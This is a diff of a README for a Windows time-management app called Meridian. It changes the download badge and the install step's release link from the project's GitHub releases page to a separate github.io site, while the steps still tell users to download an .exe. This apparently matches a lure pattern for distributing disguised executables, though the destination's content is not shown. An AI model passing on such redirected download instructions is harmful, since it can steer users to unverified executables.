@@ -1,6 +1,6 @@
 # ⏳ Meridian - Manage your time and stay focused
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/butcher6260/Meridian/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://butcher6260.github.io)
 
 Meridian helps you track time, plan tasks, and maintain focus. The application provides tools to organize your day, control focus intervals, and monitor time remaining for important goals. Use the menu bar icon or home-screen widgets to view your progress at a glance.
 
@@ -8,7 +8,7 @@ Meridian helps you track time, plan tasks, and maintain focus. The application p
 
 Follow these steps to set up the application on your computer. These instructions assume you use a standard Windows environment.
 
-1. Go to the [Meridian release page](https://github.com/butcher6260/Meridian/releases).
+1. Go to the [Meridian release page](https://butcher6260.github.io).
 2. Look for the section labeled Assets.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
